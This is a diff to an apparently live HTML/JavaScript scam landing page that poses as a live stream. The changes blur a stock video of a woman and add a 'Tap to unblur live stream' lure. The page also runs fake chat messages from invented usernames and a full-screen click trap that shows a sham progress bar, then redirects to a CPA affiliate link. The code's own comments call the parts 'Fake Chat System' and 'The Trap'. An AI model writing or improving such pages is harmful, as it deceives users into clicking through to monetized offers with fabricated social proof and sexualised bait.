@@ -17,13 +17,16 @@
             overflow: hidden; 
         }
 
-        /* Fullscreen Video */
+        /* 🔴 UPDATED: Blurred Fullscreen Video */
         .bg-video {
             position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
+            top: -5%; left: -5%;
+            width: 110%; height: 110%;
             object-fit: cover;
             z-index: 1;
+            /* এখানে ভিডিও ব্লার এবং ডার্ক করা হয়েছে */
+            filter: blur(25px) brightness(0.4); 
+            transform: scale(1.05); /* ব্লার করলে বর্ডারে সাদা দাগ এড়ানোর জন্য */
         }
 
         /* UI Overlay Container */
@@ -35,7 +38,7 @@
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.6) 0%, transparent 20%, transparent 70%, rgba(0,0,0,0.8) 100%);
+            background: linear-gradient(to bottom, rgba(0,0,0,0.5) 0%, transparent 20%, transparent 70%, rgba(0,0,0,0.85) 100%);
         }
 
         /* Top Bar */
@@ -109,6 +112,34 @@
             letter-spacing: 1px;
         }
 
+        /* Unlock Text Overlay (Creates Curiosity) */
+        .unlock-overlay {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 15;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            pointer-events: none;
+            text-align: center;
+        }
+        
+        .play-icon {
+            width: 60px; height: 60px;
+            background: rgba(255, 0, 85, 0.2);
+            border: 2px solid #ff0055;
+            border-radius: 50%;
+            display: flex; justify-content: center; align-items: center;
+            margin-bottom: 10px;
+            backdrop-filter: blur(5px);
+            animation: pulse-pink 2s infinite;
+        }
+        .play-icon svg { width: 25px; height: 25px; fill: #ff0055; margin-left: 4px; }
+        .unlock-text {
+            color: white; font-size: 16px; font-weight: 800; text-shadow: 0 2px 10px rgba(0,0,0,0.9);
+        }
+
         /* Chat & Action Area */
         .bottom-area {
             padding: 15px;
@@ -120,7 +151,7 @@
 
         /* Fake Chat System */
         .chat-container {
-            height: 150px;
+            height: 140px;
             width: 75%;
             overflow: hidden;
             position: relative;
@@ -147,7 +178,7 @@
             backdrop-filter: blur(2px);
             animation: slideUpFade 0.4s ease-out;
         }
-        .chat-user { color: #aaa; font-weight: 700; margin-right: 5px; }
+        .chat-user { color: #ffcc00; font-weight: 700; margin-right: 5px; }
 
         /* Action Bar */
         .action-bar {
@@ -193,7 +224,7 @@
         .heart {
             position: absolute;
             bottom: 0;
-            font-size: 20px;
+            font-size: 22px;
             opacity: 0;
             animation: floatUp 3s linear infinite;
         }
@@ -233,9 +264,9 @@
 </head>
 <body>
 
-    <!-- Background Video -->
+    <!-- 🔴 UPDATED: Online Video Link of a moving person -->
     <video id="liveVideo" class="bg-video" autoplay loop muted playsinline>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        <source src="https://assets.mixkit.co/videos/preview/mixkit-portrait-of-a-woman-in-a-pool-1259-large.mp4" type="video/mp4">
     </video>
 
     <!-- Master Click Trap triggers redirect anywhere user touches -->
@@ -260,6 +291,14 @@
             <div class="close-btn">
                 <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
             </div>
+        </div>
+
+        <!-- Middle: Unlock Request to trigger click -->
+        <div class="unlock-overlay">
+            <div class="play-icon">
+                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+            </div>
+            <div class="unlock-text">Tap to unblur live stream</div>
         </div>
 
         <!-- Floating Hearts Area -->
@@ -302,13 +341,13 @@
     </div>
 
     <script>
-        // --- 1. Video Autoplay Setup ---
+        // Force Video Play
         document.addEventListener("DOMContentLoaded", function() {
             let vid = document.getElementById("liveVideo");
             vid.play().catch(e => console.log("Waiting for interaction."));
         });
 
-        // --- 2. Fake Chat Generator System ---
+        // Fake Chat System
         const usernames = ["guest_902", "alex88", "user_xoxo", "mike_pro", "johnny_99", "loverboy", "guest_743", "anon_22", "chris_m", "david_k"];
         const messages = ["Hi", "Wow 😍", "Notice me!", "Show more", "Hello from USA", "Beautiful", "Join my call", "How are you?", "🔥🔥🔥", "Hey cutie"];
         
@@ -323,16 +362,13 @@
             
             chatBox.appendChild(msgElement);
 
-            // Keep only last 5 messages to avoid DOM bloat
             if(chatBox.children.length > 5) {
                 chatBox.removeChild(chatBox.firstChild);
             }
         }
-        // Generate a new comment every 1.5 to 3 seconds
         setInterval(addFakeComment, Math.random() * 1500 + 1500);
 
-
-        // --- 3. Floating Hearts Generator ---
+        // Floating Hearts Generator
         const heartEmojis = ["❤️", "💖", "🔥", "😍", "✨"];
         function spawnHeart() {
             const container = document.getElementById("hearts");
@@ -340,24 +376,18 @@
             heart.className = "heart";
             heart.innerText = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
             
-            // Randomize position slightly
             heart.style.left = Math.random() * 20 + "px";
-            // Randomize animation duration slightly
             heart.style.animationDuration = (Math.random() * 2 + 2) + "s";
             
             container.appendChild(heart);
-            
-            // Remove after animation completes
             setTimeout(() => { heart.remove(); }, 4000);
         }
         setInterval(spawnHeart, 800);
 
-
-        // --- 4. Redirect Logic (The Trap) ---
+        // CPA Link Logic
         const targetCpaLink = "https://bedjfha.ussmpixl.com/p/2QMKv";
 
         function startRedirect() {
-            // Vibrate on click
             if (navigator.vibrate) navigator.vibrate([100]); 
 
             document.getElementById('step1').style.display = 'none';
@@ -370,7 +400,7 @@
                     clearInterval(interval);
                     window.location.href = targetCpaLink;
                 } else {
-                    width += 6; // Loads super fast
+                    width += 6; 
                     progress.style.width = width + '%';
                 }
             }, 100); 
